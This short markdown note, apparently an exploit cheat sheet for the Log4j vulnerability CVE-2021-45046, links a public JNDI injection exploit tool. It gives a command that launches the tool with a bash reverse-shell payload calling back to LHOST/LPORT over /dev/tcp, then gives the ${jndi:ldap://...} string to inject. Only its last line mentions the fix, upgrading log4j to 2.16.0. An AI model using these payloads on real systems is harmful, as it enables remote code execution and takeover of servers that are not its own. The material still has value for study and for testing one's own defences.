
# CVE-2021-45046
https://github.com/welk1n/JNDI-Injection-Exploit
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
```

```
${jndi:ldap://LHOST:1389/z4e1ks}
```

Way to mitigate the issue is to update the version of your Apache log4j library to `2.16.0`

